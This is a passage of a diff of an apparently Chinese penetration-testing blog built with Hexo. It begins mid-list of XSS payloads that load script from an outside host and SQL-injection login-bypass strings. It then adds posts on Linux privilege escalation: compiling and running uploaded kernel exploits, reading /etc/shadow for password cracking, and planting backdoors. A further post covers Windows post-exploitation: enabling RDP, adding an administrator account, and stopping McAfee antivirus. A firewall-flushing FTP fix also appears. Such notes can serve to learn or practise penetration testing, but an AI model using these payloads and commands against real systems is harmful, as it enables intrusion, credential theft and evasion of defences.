class="string">''</span> src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT <span class="string">"a='&gt;'"</span> src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT&gt;document.write(<span class="string">"&lt;SCRI"</span>);&lt;/SCRIPT&gt;PT src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br><span class="line">admin<span class="string">'--</span></span><br><span class="line"><span class="string">'</span> or 0=0 --</span><br><span class="line"><span class="string">" or 0=0 --</span></span><br><span class="line"><span class="string">or 0=0 --</span></span><br><span class="line"><span class="string">' or 0=0 #</span></span><br><span class="line"><span class="string">"</span> or 0=0 <span class="comment">#</span></span><br><span class="line">or 0=0 <span class="comment">#</span></span><br><span class="line"><span class="string">' or '</span>x<span class="string">'='</span>x</span><br><span class="line"><span class="string">" or "</span>x<span class="string">"="</span>x</span><br><span class="line"><span class="string">') or ('</span>x<span class="string">'='</span>x</span><br><span class="line"><span class="string">' or 1=1--</span></span><br><span class="line"><span class="string">" or 1=1--</span></span><br><span class="line"><span class="string">or 1=1--</span></span><br><span class="line"><span class="string">'</span> or a=a--</span><br><span class="line"><span class="string">" or "</span>a<span class="string">"="</span>a</span><br><span class="line"><span class="string">') or ('</span>a<span class="string">'='</span>a</span><br><span class="line"><span class="string">") or ("</span>a<span class="string">"="</span>a</span><br><span class="line">hi<span class="string">" or "</span>a<span class="string">"="</span>a</span><br><span class="line">hi<span class="string">" or 1=1 --</span></span><br><span class="line"><span class="string">hi' or 1=1 --</span></span><br><span class="line"><span class="string">hi' or 'a'='a</span></span><br><span class="line"><span class="string">hi') or ('a'='a</span></span><br><span class="line"><span class="string">hi"</span>) or (<span class="string">"a"</span>=<span class="string">"a[/code]</span></span><br></pre></td></tr></table></figure>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/09/06/FTP错误No-route-to-host-解决办法/" title="FTP错误No route to host 解决办法" itemprop="url">FTP错误No route to host 解决办法</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-09-06T03:28:04.000Z" itemprop="datePublished"> 发表于 2016-09-06</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>做渗透测写了一个程序获取靶机版本信息，连接新建的靶机FTP服务器时出现No route to host</p>
+<h2 id="如图："><a href="#如图：" class="headerlink" title="如图："></a>如图：</h2><p><img src="http://opgnaclz6.bkt.clouddn.com/0as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>这种问题一般都是防火墙问题，有可能屏蔽的FTP服务器。</p>
+<h2 id="1-检查防火墙"><a href="#1-检查防火墙" class="headerlink" title="1,检查防火墙:"></a>1,检查防火墙:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/1as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h2 id="2-清空防火墙："><a href="#2-清空防火墙：" class="headerlink" title="2,清空防火墙："></a>2,清空防火墙：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/2as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h2 id="3-保存更改的防火墙规则："><a href="#3-保存更改的防火墙规则：" class="headerlink" title="3,保存更改的防火墙规则："></a>3,保存更改的防火墙规则：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/3as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h2 id="4-解决成功，如图："><a href="#4-解决成功，如图：" class="headerlink" title="4,解决成功，如图："></a>4,解决成功，如图：</h2><p><img src="http://opgnaclz6.bkt.clouddn.com/4as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/工具/">工具</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/2016/09/05/加密XSS代码/" title="加密xss代码" itemprop="url">加密xss代码</a>
   </h1>
   <p class="article-author">By
@@ -174,7 +435,7 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/rad-linux/">rad linux</a>
+  <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/rad-linux/">rad linux</a>
 </div>
 
 
@@ -305,7 +566,7 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/windows/">windows</a>►<a class="article-category-link" href="/categories/windows/Windows2003/">Windows2003</a>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/工具/">工具</a>
 </div>
 
 
@@ -334,31 +595,33 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/05/07/记一次白帽学院解题过程/" title="记一次白帽学院解题过程" itemprop="url">记一次白帽学院解题过程</a>
+      <a href="/2016/01/01/linux提权常用命令/" title="linux提权常用命令" itemprop="url">linux提权常用命令</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
 		
   <p class="article-time">
-    <time datetime="2015-05-07T04:41:35.000Z" itemprop="datePublished"> 发表于 2015-05-07</time>
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
     
   </p>
 </header>
     <div class="article-content">
         
-        <p>首先使用Burp Suit对该链接进行抓包，结果发现并没有什么用。<br>如图：</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a1.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>接下来点了一下post按钮，出现了一堆英文，用有道翻译了一下，说是URL不能为空，点击了那个链接，发现也没用</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a2.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>试试那个链接是不是key，结果不是</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a3.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>做到这头都快大了，不知道URL要填什么，所以就每样都填了一遍，首先把key填过去发现不是，然后把‘答案’这两字填过去还是不是，把验证码填过去也不是，试验太多就不一一截图了，只截一张吧</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a4.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>试到Flag01时居然出现了一行不一样的东西</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a5.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>抱着有点小激动并伴着一点点忐忑的心态把他们都复制过去，提示答案错误，然后又试了一下只复制大括号里的，结果竟然做成功了</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+        <h3 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h3><p>输出一组系统信息。如果不跟随选项，则视为只附加-s选项。常跟的参数有-a，在我的Ubuntu10.10的终端中执行uname-a命令后显示，其中最前面的Linux表示是基于Linux内核的，2.6.35-28是具体的内核版本号。这个内核版本号非常重要，因为如果是采用溢出漏洞提权的话内核版本号是寻找溢出漏洞利用程序最重要的参考信息，根据当前的内核版本号寻找适用于这个版本号的漏洞利用程序。</p>
+<h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>获得当前目录，在用webshell上传漏洞和用程序前执行一下pwd命令获得当前目录，把漏洞利用程序直接上传到当前目录，在执行漏洞利用程序时就可以免去输入目录的麻烦。执行pwd命令后显示/home/test，说明当前目录为/home/test/。另外，通过webshell比如PhpSpy的“Back Connect”反弹回来的shell默认的当前目录为webshell所在的目录。</p>
+<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>显示网络配置信息，比如显示有哪些网卡，每块网卡的配置信息（IP地址、MAC地址、子网掩码）等，常用参数-a执行ifconfig-a命令后显示。从信息可以知道，当前系统共有一块网卡etho，IP地址为192.168.19.138，子网掩码为255.255.255.0。</p>
+<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>显示当前的网络连接状态，与Windows系统下的netstat命令写法相同，功能也差不多。</p>
+<p>执行netstat后显示了很多网络连接的信息。</p>
+<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>ps是用来报告程序执行状况的指令，你可以搭配kill指令随时中断，删除不必要的程序。常用的参数有a，u，x<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a 显示现行终端机下的所有程序，包括其他用户的程序。</span><br><span class="line">u 以用户为主的格式来显示程序状况。</span><br><span class="line">x 显示所有程序，不以终端机来区分。</span><br></pre></td></tr></table></figure></p>
+<p>执行ps aux命令后显示，显示了程序的进程id，CPU占用率等详细信息，如果要结束某个程序，只需要用命令kill-9 PID就可以结束，其中PID就是在执行ps aux命令时显示的程序的PID，当然前提是要有相应的权限。</p>
+<h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><p>很多Linux下的漏洞利用程序都是用C语言写的，我们得到的很多时候是漏洞利用程序的C语言的源代码，要想得到可执行程序，需要对源代码进行编辑，这时候就用到大名鼎鼎的gcc了。个别情况下可能因为兼容性的原因必须需要在要提权的Linux主机上编译漏洞利用程序，这时候也需要用到gcc。GCC（GNU Compiler Collection，GNU编译器套装），是一套由GNU开发的编程语言编译器。它是一套以GPL及LGPL许可证所发行的自由软件，也是GNU计划的关键部分，亦是自由的类Unix及苹果电脑Mac OS X操作系统的标准编译器。GCC原名为GNUC语言编译器，因为它原本只能处理C语言，GCC很快地扩展，变得可处理C++，之后也变得可处理Fortran、Pascal、Objective-C、Java，以及Ada与其他语言。</p>
+<p>在大多数情况下，你在本地的Linux系统中编译好的溢出漏洞利用程序直接上传到要提权的Linux主机上也能正常使用，不是必须要在要提权的主机上编译溢出漏洞的利用程序。因为gcc特别强大，功能特别多，用法也特别多，要讲全的话估计要一本厚书的篇幅，这里不可能一一介绍，只介绍Linux提权中常用到的两个方面：</p>
+<p>(1)gcc-v<br>查看安装的gcc的版本，我们的目的是通过执行gcc-v命令确认系统是否安装了gcc，如果安装了会显示安装的gcc的版本号如果提示找不到命令等说明gcc没有安装。Ubuntu 10.10默认安装了gcc。</p>
+<p>(2)另一个用到的重要功能就是把漏洞利用程序的源代码编译成可执行程序了。假设溢出漏洞利用程序源代码文件是exp.c，通过websbell把exp.c上传到了要提权的Linux主机的当前目录下，在反弹回来的命令窗口中执行gcc-o exp exp.c，就会把exp.c编程成可执行程序exp，其中-o参数后面跟着的是编译生成的可执行程序的名字，这里为exp，另一个参数exp.c是要编译的溢出漏洞利用程序源代码的文件名，这里为exp.c。执行命令后如果没有错误提示就说明编译成功了。执行一下命令ls，发现可执行文件exp已经生成了。<br>接下来输入./exp就可以运行漏洞利用程序exp了，如果溢出成功会显示，注意下面的那个#，对Linux有点了解的都知道#对应的是root权限，看到#就说明提权成功了，接下来你就可以以root权限运行各种命令了。<br>在通过溢出漏洞获得root权限后，能执行的命令就多了，很多没提权前没权限执行的命令现在都可以执行了。这时候可以执行一些命令来获取一些敏感信息或进行留后门清理日志等操作，方便更好的控制提权成功的服务器。</p>
+<h3 id="cat-bash-history"><a href="#cat-bash-history" class="headerlink" title="cat .bash_history"></a>cat .bash_history</h3><p>查看该用户曾经执行过的命令，也就是查看root用户执行过的命令。因为Linux下很多管理操作都是在命令行下完成的，而正常情况下用root用户执行命令的是管理员，通过查看管理员输入的命令，可能得到很多敏感信息。       </p>
+<h3 id="cat-etc-passwd-cat-etc-shadow"><a href="#cat-etc-passwd-cat-etc-shadow" class="headerlink" title="cat/etc/passwd cat/etc/shadow"></a>cat/etc/passwd cat/etc/shadow</h3><p>分别执行cat/etc/passwd，cat/etc/shadow命令后得到passwd和shadow的内容，把两个文件的内容保存到本地用john挂字典尝试破解root用户的密码，具体怎么破可以自己查询相关信息。cat/etc/shadow只有root权限才能执行。</p>
+<h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><p>在提权成功获得root权限后你如果想下载服务器上的一个文件到本地，我的方法是先执行cp命令把要下载的文件复制到网站的Web目录下，但复制过去的文件只有root用户能访问，直接用浏览器下载会提示没有权限，这时候就需要用到chmod命令了。chmod命令的作用是变更文件或目录的权限。如果要下载的文件是shadow1，执行命令chmod 777./shadow1后就可以直接用浏览器下载了，不会再有权限问题了。</p>
 
         
         
@@ -371,7 +634,97 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/其他/">其他</a>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/windows提权常用命令/" title="windows提权常用命令" itemprop="url">windows提权常用命令</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>平时常用到的windows提权命令，纯粹当成个人笔记方便以后查阅。还在不断更新中。。。。。。<br>开启3389:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p>
+<p>查看3389:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server\WinStations\RDP-Tcp /v PortNumber</span><br></pre></td></tr></table></figure></p>
+<p>查看端口8001被哪个进程占用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr <span class="string">"8001"</span></span><br></pre></td></tr></table></figure></p>
+<p>查看PID3736<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr <span class="string">"3736"</span></span><br></pre></td></tr></table></figure></p>
+<p>结束进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /t /im java.exe</span><br></pre></td></tr></table></figure></p>
+<p>查看版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure></p>
+<p>查看当前用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
+<p>查看系统配置信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p>
+<p>查看用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></p>
+<p>查看进程：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure></p>
+<p>查看正在运行的服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure></p>
+<p>查看开放的所有端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></p>
+<p>查询会话情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user  //当前这个服务器中有哪些用户正在访问这个服务器</span><br></pre></td></tr></table></figure></p>
+<p>查看指定服务的路径：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc mssql</span><br></pre></td></tr></table></figure></p>
+<p>添加一个用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong xiaochong /add</span><br></pre></td></tr></table></figure></p>
+<p>提升到管理权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators xiaochong /add</span><br></pre></td></tr></table></figure></p>
+<p>添加用户并提升权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add</span><br></pre></td></tr></table></figure></p>
+<p>查看指定用户的信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong</span><br></pre></td></tr></table></figure></p>
+<p>查看所有管理权限的用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></p>
+<p>加入远程桌面用户组：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup “Remote Desktop Users” xiaochong /add</span><br></pre></td></tr></table></figure></p>
+<p>突破最大连接数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc /admin /v:192.168.1.101</span><br></pre></td></tr></table></figure></p>
+<p>删除用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong /del</span><br></pre></td></tr></table></figure></p>
+<p>开启TELNET服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start telnet</span><br></pre></td></tr></table></figure></p>
+<p>关闭麦咖啡：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop “McAfee McShield”</span><br></pre></td></tr></table></figure></p>
+<p>查看当前目录的所有文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\windows\</span><br></pre></td></tr></table></figure></p>
+<p>查看指定文件的内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\windows\Debug.txt</span><br></pre></td></tr></table></figure></p>
+<p>把Debug.txt复制到C:\windows\addins\并命名为cmd.txt：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\windows\Debug.txt C:\windows\addins\cmd.txt</span><br></pre></td></tr></table></figure></p>
+<p>切换到系统根目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> \</span><br></pre></td></tr></table></figure></p>
+<p>返回上一级目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure></p>
+<p>进入系统e盘：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e：</span><br></pre></td></tr></table></figure></p>
+<p>如果直接进入c:\windows\system32\目录，可执行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pushd c:\windows\system32\</span><br></pre></td></tr></table></figure></p>
+<p>创建ahackj文件夹：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Md xiaochong</span><br></pre></td></tr></table></figure></p>
+<p>删除xiaochong文件夹：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rd xiaochong</span><br></pre></td></tr></table></figure></p>
+<p>删除网站目录下的xiaochong.asp文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Del E:\xinyun\xiaochong.asp</span><br></pre></td></tr></table></figure></p>
+<p>创建空的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> nul&gt;文件名</span><br></pre></td></tr></table></figure></p>
+<p>创建有内容文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"内容"</span>&gt;文件名</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
 </div>
 
 
@@ -396,7 +749,7 @@
 
 
   <nav id="page-nav" class="clearfix">
-    <a class="extend prev" rel="prev" href="/page/3/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
+    <a class="extend prev" rel="prev" href="/page/3/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next<span></span></a>
   </nav>
 
 </div>
@@ -412,42 +765,11 @@
   
 <div class="category-block">
   <h3 class="asidetitle">分类</h3>
-     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/git/hexo/">hexo</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/windows/Windows2003/">Windows2003</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/">提权免杀</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/windows提权/">windows提权</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" 